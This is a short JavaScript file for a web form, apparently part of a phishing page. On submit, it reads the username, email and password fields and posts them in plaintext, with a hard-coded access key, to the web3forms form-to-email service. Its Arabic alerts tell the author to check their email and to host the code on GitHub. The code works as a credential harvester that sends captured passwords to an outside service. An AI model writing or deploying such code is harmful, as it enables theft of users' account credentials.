let password;
let email;
let username;
const myForm = document.getElementById("hjl");

myForm.onsubmit = function(event) {
    event.preventDefault(); 
    
    password = document.getElementById("pass").value;
    email = document.getElementById("myemail").value;
    username = document.getElementById("myusername").value;

    console.log("جاري محاولة الإرسال...");

    fetch("https://api.web3forms.com/submit", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Accept": "application/json"
        },
        body: JSON.stringify({
            access_key: "39811b50-6061-41cd-bd7b-d07bc23738d1",
            username: username,
            email: email,
            password: password
        })
    })
    .then(async (response) => {
        if (response.ok) {
            alert("تم إرسال المعلومات بنجاح! افحص إيميلك.");
            myForm.reset();
        } else {
            alert("حدث خطأ في السيرفر، تأكد من الـ Access Key.");
        }
    })
    .catch(error => {
        console.log(error);
        alert("فشل الاتصال. تأكد من رفع الكود لـ GitHub وتجربته من الرابط.");
    });
};


